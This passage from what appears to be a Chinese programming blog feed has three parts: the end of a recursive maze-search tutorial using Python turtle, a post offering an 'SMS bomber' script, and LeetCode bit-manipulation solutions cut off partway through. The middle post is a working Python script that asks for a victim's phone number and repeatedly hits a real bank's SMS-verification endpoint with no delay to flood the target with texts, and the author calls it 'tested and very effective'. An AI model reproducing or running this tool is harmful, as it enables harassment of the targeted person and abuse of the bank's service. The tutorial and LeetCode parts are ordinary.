如果乌龟撞到墙上，它必须尝试不同的方向。乌龟将需要一个程序，以找到迷宫的出路。这里是过程：</p><ol><li>从我们的起始位置，我们将首先尝试向北一格，然后从那里递归地尝试我们的程序。</li><li>如果我们通过尝试向北作为第一步没有成功，我们将向南一格，并递归地重复我们的程序。</li><li>如果向南也不行，那么我们将尝试向西一格，并递归地重复我们的程序。</li><li>如果北，南和西都没有成功，则应用程序从当前位置递归向东。</li><li>如果这些方向都没有成功，那么没有办法离开迷宫，我们失败。</li></ol><p>现在，这听起来很容易，但有几个细节先谈谈。假设我们第一步是向北走。按照我们的程序，我们的下一步也将是向北。但如果北面被一堵墙阻挡，我们必须看看程序的下一步，并试着向南。不幸的是，向南使我们回到原来的起点。如果我们从那里再次应用递归过程，我们将又回到向北一格，并陷入无限循环。所以，我们必须有一个策略来记住我们去过哪。在这种情况下，我们假设有一袋面包屑可以撒在我们走过的路上。如果我们沿某个方向迈出一步，发现那个位置上已经有面包屑，我们应该立即后退并尝试程序中的下一个方向。我们看看这个算法的代码，就像从递归函数调用返回一样简单。</p><p>正如我们对所有递归算法所做的一样，让我们回顾一下基本情况。其中一些你可能已经根据前一段的描述猜到了。在这种算法中，有四种基本情况要考虑：</p><ol><li>乌龟撞到了墙。由于这一格被墙壁占据，不能进行进一步的探索。</li><li>乌龟找到一个已经探索过的格。我们不想继续从这个位置探索，否则会陷入循环。</li><li>我们发现了一个外边缘，没有被墙壁占据。换句话说，我们发现了迷宫的一个出口。</li><li>我们探索了一格在四个方向上都没有成功。</li></ol><p>为了我们的程序工作，我们将需要有一种方式来表示迷宫。为了使这个更有趣，我们将使用 <code>turtle</code> 模块来绘制和探索我们的迷宫，以使我们看到这个算法的功能。迷宫对象将提供以下方法让我们在编写搜索算法时使用：</p><ul><li><code>__init__</code> 读取迷宫的数据文件，初始化迷宫的内部表示，并找到乌龟的起始位置。</li><li><code>drawMaze</code> 在屏幕上的一个窗口中绘制迷宫。</li><li><code>updatePosition</code> 更新迷宫的内部表示，并更改窗口中乌龟的位置。</li><li><code>isExit</code> 检查当前位置是否是迷宫的退出位置。</li></ul><p>Maze 类还重载索引运算符 <code>[]</code> ，以便我们的算法可以轻松访问任何特定格的状态。</p><p>让我们来查看称为 <code>searchFrom</code> 的搜索函数的代码。代码如 Listing 3 所示。请注意，此函数需要三个参数：迷宫对象，起始行和起始列。 这很重要，因为作为递归函数，搜索在每次递归调用时开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchFrom</span><span class="params">(maze, startRow, startColumn)</span>:</span></div><div class="line">    maze.updatePosition(startRow, startColumn)</div><div class="line">   <span class="comment">#  Check for base cases:</span></div><div class="line">   <span class="comment">#  1. We have run into an obstacle, return false</span></div><div class="line">    <span class="keyword">if</span> maze[startRow][startColumn] == OBSTACLE :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="comment">#  2. We have found a square that has already been explored</span></div><div class="line">    <span class="keyword">if</span> maze[startRow][startColumn] == TRIED:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="comment"># 3. Success, an outside edge not occupied by an obstacle</span></div><div class="line">    <span class="keyword">if</span> maze.isExit(startRow,startColumn):</div><div class="line">        maze.updatePosition(startRow, startColumn, PART_OF_PATH)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    maze.updatePosition(startRow, startColumn, TRIED)</div><div class="line"></div><div class="line">    <span class="comment"># Otherwise, use logical short circuiting to try each</span></div><div class="line">    <span class="comment"># direction in turn (if needed)</span></div><div class="line">    found = searchFrom(maze, startRow<span class="number">-1</span>, startColumn) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow+<span class="number">1</span>, startColumn) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow, startColumn<span class="number">-1</span>) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow, startColumn+<span class="number">1</span>)</div><div class="line">    <span class="keyword">if</span> found:</div><div class="line">        maze.updatePosition(startRow, startColumn, PART_OF_PATH)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        maze.updatePosition(startRow, startColumn, DEAD_END)</div><div class="line">    <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 3</em></p><p>你会看到代码的第一行（行 2）调用 <code>updatePosition</code>。这只是为了可视化算法，以便你可以看到乌龟如何探索通过迷宫。接下来算法检查四种基本情况中的前三种：乌龟是否碰到墙（行 5）？乌龟是否回到已经探索过的格子（行 8）？乌龟有没有到达出口（行 11）？如果这些条件都不为真，则我们继续递归搜索。</p><p>你会注意到，在递归步骤中有四个对 <code>searchFrom</code> 的递归调用。很难预测将有多少个递归调用，因为它们都由 <code>or</code> 语句连接。如果对 <code>searchFrom</code> 的第一次调用返回 <code>True</code> ，则不需要最后三个调用。你可以理解这一步向 <code>(row-1,column)</code>（或北，如果你从地理位置上思考）是在迷宫的路径上。如果没有一个好的路径向北，那么尝试下一个向南的递归调用。如果向南失败，然后尝试向西，最后向东。如果所有四个递归调用返回 <code>False</code>，那么认为是一个死胡同。你应该下载或输入整个程序，并通过更改这些调用的顺序进行实验。</p><p><code>Maze</code> 类的代码如 Listing 4，Listing 5 和 Listing 6 所示。<code>__init__</code> 方法将文件的名称作为其唯一参数。此文件是一个文本文件，通过使用 <code>+</code> 字符表示墙壁，空格表示空心方块，并使用字母 <code>S</code> 表示起始位置。Figure 3 是迷宫数据文件的示例。迷宫的内部表示是列表的列表。 <code>mazelist</code> 实例变量的每一行也是一个列表。此辅助列表使用上述字符，每格表示一个字符。Figure 3 中的数据文件，内部表示如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[ [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>]]</div></pre></td></tr></table></figure><p><code>drawMaze</code> 方法使用这个内部表示在屏幕上绘制迷宫的初始视图。</p><p>Figure 3：示例迷宫数据文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">++++++++++++++++++++++</div><div class="line">+   +   ++ ++     +</div><div class="line">+ +   +       +++ + ++</div><div class="line">+ + +  ++  ++++   + ++</div><div class="line">+++ ++++++    +++ +  +</div><div class="line">+          ++  ++    +</div><div class="line">+++++ ++++++   +++++ +</div><div class="line">+     +   +++++++  + +</div><div class="line">+ +++++++      S +   +</div><div class="line">+                + +++</div><div class="line">++++++++++++++++++ +++</div></pre></td></tr></table></figure><p><em>Figure 3</em></p><p>如 Listing 5 所示，<code>updatePosition</code> 方法使用相同的内部表示来查看乌龟是否遇到了墙。它还用 <code>.</code> 或 <code>-</code> 更新内部表示，以表示乌龟已经访问了特定格子或者格子是死角。 此外，<code>updatePosition</code> 方法使用两个辅助方法<code>moveTurtle</code> 和 <code>dropBreadCrumb</code> 来更新屏幕上的视图。</p><p>最后，<code>isExit</code> 方法使用乌龟的当前位置来检测退出条件。退出条件是当乌龟已经到迷宫的边缘时，即行零或列零，或者在最右边列或底部行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maze</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,mazeFileName)</span>:</span></div><div class="line">        rowsInMaze = <span class="number">0</span></div><div class="line">        columnsInMaze = <span class="number">0</span></div><div class="line">        self.mazelist = []</div><div class="line">        mazeFile = open(mazeFileName,<span class="string">'r'</span>)</div><div class="line">        rowsInMaze = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> mazeFile:</div><div class="line">            rowList = []</div><div class="line">            col = <span class="number">0</span></div><div class="line">            <span class="keyword">for</span> ch <span class="keyword">in</span> line[:<span class="number">-1</span>]:</div><div class="line">                rowList.append(ch)</div><div class="line">                <span class="keyword">if</span> ch == <span class="string">'S'</span>:</div><div class="line">                    self.startRow = rowsInMaze</div><div class="line">                    self.startCol = col</div><div class="line">                col = col + <span class="number">1</span></div><div class="line">            rowsInMaze = rowsInMaze + <span class="number">1</span></div><div class="line">            self.mazelist.append(rowList)</div><div class="line">            columnsInMaze = len(rowList)</div><div class="line"></div><div class="line">        self.rowsInMaze = rowsInMaze</div><div class="line">        self.columnsInMaze = columnsInMaze</div><div class="line">        self.xTranslate = -columnsInMaze/<span class="number">2</span></div><div class="line">        self.yTranslate = rowsInMaze/<span class="number">2</span></div><div class="line">        self.t = Turtle(shape=<span class="string">'turtle'</span>)</div><div class="line">        setup(width=<span class="number">600</span>,height=<span class="number">600</span>)</div><div class="line">        setworldcoordinates(-(columnsInMaze<span class="number">-1</span>)/<span class="number">2</span><span class="number">-.5</span>,</div><div class="line">                            -(rowsInMaze<span class="number">-1</span>)/<span class="number">2</span><span class="number">-.5</span>,</div><div class="line">                            (columnsInMaze<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">.5</span>,</div><div class="line">                            (rowsInMaze<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">.5</span>)</div></pre></td></tr></table></figure><p><em>Listing 4</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawMaze</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(self.rowsInMaze):</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(self.columnsInMaze):</div><div class="line">            <span class="keyword">if</span> self.mazelist[y][x] == OBSTACLE:</div><div class="line">                self.drawCenteredBox(x+self.xTranslate,</div><div class="line">                                     -y+self.yTranslate,</div><div class="line">                                     <span class="string">'tan'</span>)</div><div class="line">    self.t.color(<span class="string">'black'</span>,<span class="string">'blue'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawCenteredBox</span><span class="params">(self,x,y,color)</span>:</span></div><div class="line">    tracer(<span class="number">0</span>)</div><div class="line">    self.t.up()</div><div class="line">    self.t.goto(x<span class="number">-.5</span>,y<span class="number">-.5</span>)</div><div class="line">    self.t.color(<span class="string">'black'</span>,color)</div><div class="line">    self.t.setheading(<span class="number">90</span>)</div><div class="line">    self.t.down()</div><div class="line">    self.t.begin_fill()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        self.t.forward(<span class="number">1</span>)</div><div class="line">        self.t.right(<span class="number">90</span>)</div><div class="line">    self.t.end_fill()</div><div class="line">    update()</div><div class="line">    tracer(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveTurtle</span><span class="params">(self,x,y)</span>:</span></div><div class="line">    self.t.up()</div><div class="line">    self.t.setheading(self.t.towards(x+self.xTranslate,</div><div class="line">                                     -y+self.yTranslate))</div><div class="line">    self.t.goto(x+self.xTranslate,-y+self.yTranslate)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dropBreadcrumb</span><span class="params">(self,color)</span>:</span></div><div class="line">    self.t.dot(color)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">updatePosition</span><span class="params">(self,row,col,val=None)</span>:</span></div><div class="line">    <span class="keyword">if</span> val:</div><div class="line">        self.mazelist[row][col] = val</div><div class="line">    self.moveTurtle(col,row)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> val == PART_OF_PATH:</div><div class="line">        color = <span class="string">'green'</span></div><div class="line">    <span class="keyword">elif</span> val == OBSTACLE:</div><div class="line">        color = <span class="string">'red'</span></div><div class="line">    <span class="keyword">elif</span> val == TRIED:</div><div class="line">        color = <span class="string">'black'</span></div><div class="line">    <span class="keyword">elif</span> val == DEAD_END:</div><div class="line">        color = <span class="string">'red'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        color = <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> color:</div><div class="line">        self.dropBreadcrumb(color)</div></pre></td></tr></table></figure><p><em>Listing 5</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isExit</span><span class="params">(self,row,col)</span>:</span></div><div class="line">     <span class="keyword">return</span> (row == <span class="number">0</span> <span class="keyword">or</span></div><div class="line">             row == self.rowsInMaze<span class="number">-1</span> <span class="keyword">or</span></div><div class="line">             col == <span class="number">0</span> <span class="keyword">or</span></div><div class="line">             col == self.columnsInMaze<span class="number">-1</span> )</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self,idx)</span>:</span></div><div class="line">     <span class="keyword">return</span> self.mazelist[idx]</div></pre></td></tr></table></figure><p><em>Listing 6</em></p><p>其实吧，这段代码很多变量都没有去定义，关于迷宫的构造函数就不用在意了，关注isExit的思想与searchFrom思想就行了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;探索迷宫&quot;&gt;&lt;a href=&quot;#探索迷宫&quot; class=&quot;headerlink&quot; title=&quot;探索迷宫&quot;&gt;&lt;/a&gt;探索迷宫&lt;/h1&gt;&lt;p&gt;在这一节中，我们将讨论一个与扩展机器人世界相关的问题：你如何找到自己的迷宫？
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>短信轰炸机</title>
    <link href="http://adamzeng.site/2017/11/04/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%9C%BA/"/>
    <id>http://adamzeng.site/2017/11/04/短信轰炸机/</id>
    <published>2017-11-04T13:07:59.000Z</published>
    <updated>2017-11-04T13:11:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>用Python写成的短信轰炸机，亲测非常有效，代码如下：<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    print(<span class="string">"请输入手机号"</span>,end=<span class="string">":"</span>)</div><div class="line">    mobile=input()</div><div class="line">    <span class="keyword">if</span> len(mobile) != <span class="number">11</span>: <span class="comment">#判断输入长度</span></div><div class="line">        print(<span class="string">"手机号码长度错误！"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"请输入轰炸次数"</span>, end=<span class="string">":"</span>)</div><div class="line">        num = int(input())</div><div class="line">        print(<span class="string">"你要轰炸"</span>,num,<span class="string">"次"</span>,<span class="string">"马上开始!"</span>)</div><div class="line">        i = <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> num &gt; <span class="number">0</span> :</div><div class="line">            payload = &#123;<span class="string">"AcNo"</span>:<span class="string">""</span>,<span class="string">"MobilePhone"</span>:<span class="string">""</span>,<span class="string">"BankId"</span>:<span class="string">"9999"</span>,<span class="string">"Transaction"</span>:<span class="string">"CreditOnlineApplyCert"</span>,<span class="string">"_locale"</span>:<span class="string">"zh_CN"</span>&#125; <span class="comment">#构造关键字的字典</span></div><div class="line">            payload[<span class="string">"MobilePhone"</span>]= mobile <span class="comment">#添加字典内容</span></div><div class="line">            url = <span class="string">"https://pbank.psbc.com/pweb/GetSmsForOutQuickPayment.do?"</span></div><div class="line">            r = requests.get(url,params=payload) <span class="comment">#开始get 并构造了url</span></div><div class="line">            print(<span class="string">"正在轰炸"</span>,mobile,<span class="string">"，轰炸第"</span>,i,<span class="string">"次"</span>)</div><div class="line">            num = num - <span class="number">1</span></div><div class="line">            i+=<span class="number">1</span></div><div class="line">            time.sleep(<span class="number">0</span>)<span class="comment"># 间隔时间</span></div><div class="line">        print(<span class="string">"轰炸完成！"</span>)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用Python写成的短信轰炸机，亲测非常有效，代码如下：
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>leetcode190题131题191题231题342题</title>
    <link href="http://adamzeng.site/2017/11/03/leetcode190/"/>
    <id>http://adamzeng.site/2017/11/03/leetcode190/</id>
    <published>2017-11-03T12:53:46.000Z</published>
    <updated>2017-11-04T03:22:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode190题131题191题231题342题"><a href="#leetcode190题131题191题231题342题" class="headerlink" title="leetcode190题131题191题231题342题"></a>leetcode190题131题191题231题342题</h1><h3 id="190Reverse-Bits"><a href="#190Reverse-Bits" class="headerlink" title="190Reverse Bits"></a>190Reverse Bits</h3><p>Reverse bits of a given 32 bits unsigned integer.<a id="more"></a></p><p>For example, given input 43261596 (represented in binary as <strong>00000010100101000001111010011100</strong>), return 964176192 (represented in binary as <strong>00111001011110000010100101000000</strong>).</p><p><strong>Follow up</strong>:<br>If this function is called many times, how would you optimize it?</p><p>Related problem: <a href="https://leetcode.com/problems/reverse-integer/" target="_blank" rel="external">Reverse Integer</a></p><p><strong>Credits:</strong><br>Special thanks to <a href="https://oj.leetcode.com/discuss/user/ts" target="_blank" rel="external">@ts</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># @param n, an integer</span></div><div class="line">    <span class="comment"># @return an integer</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBits</span><span class="params">(self, n)</span>:</span></div><div class="line">        </div><div class="line">        result = <span class="number">0</span></div><div class="line">        </div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>):</div><div class="line">            bit = n%<span class="number">2</span></div><div class="line">            result = result*<span class="number">2</span> + bit</div><div class="line">            n = n/<span class="number">2</span></div><div class="line">        </div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure><h3 id="131Single-Number"><a href="#131Single-Number" class="headerlink" title="131Single Number"></a>131Single Number</h3><p>Given an array of integers, every element appears <em>twice</em> except for one. Find that single one.</p><p><strong>Note:</strong><br>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> operator</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumber</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">return</span> reduce(operator.xor,nums)</div></pre></td></tr></table></figure><h3 id="191Number-of-1-Bits"><a href="#191Number-of-1-Bits" class="headerlink" title="191Number of 1 Bits"></a>191Number of 1 Bits</h3><p>Write a function that takes an unsigned integer and returns the number of ’1’ bits it has (also known as the <a href="https://en.wikipedia.org/wiki/Hamming_weight" target="_blank" rel="external">Hamming weight</a>).</p><p>For example, the 32-bit integer ’11’ has binary representation <code>00000000000000000000000000001011</code>, so the function should return 3.</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://oj.leetcode.com/discuss/user/ts" target="_blank" rel="external">@ts</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingWeight</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        times=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>):</div><div class="line">            bit=n%<span class="number">2</span></div><div class="line">            <span class="keyword">if</span> bit==<span class="number">1</span>:</div><div class="line">                times=times+<span class="number">1</span></div><div class="line">            n=n/<span class="number">2</span></div><div class="line">        <span class="keyword">return</span> times</div></pre></td></tr></table></figure><p>sorry啦！性能只超过了40%，看了最优化的答案：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingWeight</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        res = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">            res += (n &amp; <span class="number">1</span>)</div><div class="line">            n &gt;&gt;= <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure><p>想了一下，其实是把每一位移到最后一位，与1进行&amp;运算，就可以判断该位是否存在1。</p><h3 id="231Power-of-Two"><a href="#231Power-of-Two" class="headerlink" title="231Power of Two"></a>231Power of Two</h3><p>Given an integer, write a function to determine if it is a power of two.</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://leetcode.com/discuss/user/jianchao.li.fighter" target="_blank" rel="external">@jianchao.li.fighter</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPowerOfTwo</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type n: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> n&lt;=<span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> (n&amp;(n<span class="number">-1</span>))==<span class="number">0</span></div></pre></td></tr></table></figure><p>对于一个二进制数而言，例如10000，它减去1以后的数是1111，再进行&amp;运算，必须是零，这是所有power of two，也就是2的次方数（1024等）的特点。</p><h3 id="342Power-of-Four"><a href="#342Power-of-Four" class="headerlink" title="342Power of Four"></a>342Power of Four</h3><p>Given an integer (signed 32 bits), write a function 